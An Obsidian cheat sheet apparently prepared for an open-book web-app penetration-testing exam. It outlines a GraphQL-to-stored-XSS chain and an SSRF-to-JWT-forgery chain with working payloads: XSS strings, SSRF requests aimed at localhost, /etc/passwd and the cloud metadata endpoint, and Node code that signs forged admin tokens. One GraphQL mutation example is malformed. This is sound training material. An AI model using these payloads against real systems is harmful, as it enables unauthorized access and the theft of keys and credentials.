# 🧠 PWPE Web App Pentest Exam Toolkit

This Obsidian note is structured for quick lookup during the open-book exam. It combines tactics, payloads, and findings from the **Advance Web Hacking** course and the **PWPE Beta Exam**.

---

## 📌 Table of Contents
- [[🧩 Attack Chain 1: GraphQL → Stored XSS]]
- [[🔍 Attack Chain 2: JS Analysis → SSRF → JWT Forgery]]
- [[🔐 JWT Forgery Quick Guide]]
- [[📊 GraphQL Recon & Tools]]
- [[📤 SSRF Enumeration]]
- [[🚨 Stored XSS Examples]]
- [[🧪 Checklist: What to Try During Exam]]

---

## 🧩 Attack Chain 1: GraphQL → Stored XSS

```mermaid
graph TD
A[GraphQL Endpoint Found] --> B[Enable Introspection]
B --> C[Query for Roles & Perms]
C --> D[Gain Dev Role]
D --> E[Send XSS Payload via POST]
E --> F[Trigger Payload → Alert]
```



### ✅ Steps
1. **Find GraphQL endpoint** (`/graphql`)
2. Run introspection:
   ```graphql
   {
     __schema {
       types {
         name
       }
     }
   }
   ```
3. Identify mutation that allows role change or comment post
4. Use dev role to send:
   ```json
   {
     "query": "mutation { postComment(text: "") }"
   }
   ```
5. Load page as victim → see alert

---

## 🔍 Attack Chain 2: JS Analysis → SSRF → JWT Forgery

```mermaid
graph TD
A[Beautify JS Files] --> B[Find Hidden Endpoint (/health)]
B --> C[SSRF via GET param]
C --> D[Request /api/key?key=private]
D --> E[Leak RSA Private Key]
E --> F[Forge JWT for Admin]
F --> G[Paste JWT into Local Storage]
G --> H[Admin Panel Access]
```

### ✅ Key Notes
- Use `https://beautifier.io/` or browser dev tools to prettify JS
- SSRF:
   ```bash
   curl "http://target.site/health?url=http://localhost/api/key?key=private"
   ```
- Decode leaked RSA Key
- Forge token:
   ```json
   {
     "id": "Me26yIF3",
     "email": "test@test.com",
     "role": "admin",
     "iat": 1681000000,
     "exp": 1682000000
   }
   ```
- Sign with leaked private key
- Store:
   ```js
   localStorage.setItem("jwt", "<FORGED_TOKEN>");
   ```

---

## 🔐 JWT Forgery Quick Guide

### 1. Use leaked private key
### 2. Payload format
```json
{
  "id": "Me26yIF3",
  "role": "admin"
}
```

### 3. Encode with:
- `jwt.io` (manually paste RSA key)
- Or `jsonwebtoken` in Node.js:
```js
const jwt = require('jsonwebtoken');
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });
```

---

## 📊 GraphQL Recon & Tools

- Tools: **InQL**, **GraphQL Voyager**, **Postman**
- Query Types:
```graphql
query {
  __type(name: "Mutation") {
    fields {
      name
    }
  }
}
```
- Watch for:
  - `updateUserRole`, `grantDevAccess`
  - `postMessage`, `submitComment`

---

## 📤 SSRF Enumeration

Try:
- `?url=http://localhost:80/`
- `?url=http://127.0.0.1/admin`
- `?url=file:///etc/passwd` *(rare)*
- `?url=http://169.254.169.254/latest/meta-data/`

Use Burp Repeater or curl.

---

## 🚨 Stored XSS Examples

```html

<svg onload=alert(1)>
<script>alert(1)</script>
```

Use fields that appear on dashboard or user profile.

---

## 🧪 Checklist: What to Try During Exam

- [ ] Look for GraphQL endpoint
- [ ] Try introspection
- [ ] Check for token escalation
- [ ] Search for hidden endpoints via JS
- [ ] Look for SSRF patterns
- [ ] Check for stored XSS sinks
- [ ] Try forging JWT with leaked keys

---

> Use Cmd/Ctrl+F to search this doc. Keep Burp, Postman, and Obsidian open at all times.
